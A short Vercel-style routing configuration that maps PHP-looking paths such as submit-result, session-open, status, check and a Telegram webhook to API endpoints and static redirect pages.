{
  "version": 2,
  "routes": [
    { "src": "^/next\.php/submit-result$", "dest": "/api/submit-result" },
    { "src": "^/next\.php/session-open$", "dest": "/api/session-open" },
    { "src": "^/next\.php/status/([^/]+)$", "dest": "/api/status?sessionId=$1" },
    { "src": "^/next\.php/telegram-webhook$", "dest": "/api/webhook" },
    { "src": "^/next\.php/config$", "dest": "/api/config" },
    { "src": "^/next\.php/setup-webhook$", "dest": "/api/setup-webhook" },
    { "src": "^/check\.php$", "dest": "/api/check" },
    { "src": "^/redirect\.php$", "dest": "/redirect.html" },
    { "src": "^/rejectnumber\.php$", "dest": "/rejectnumber.html" },
    { "handle": "filesystem" }
  ]
}
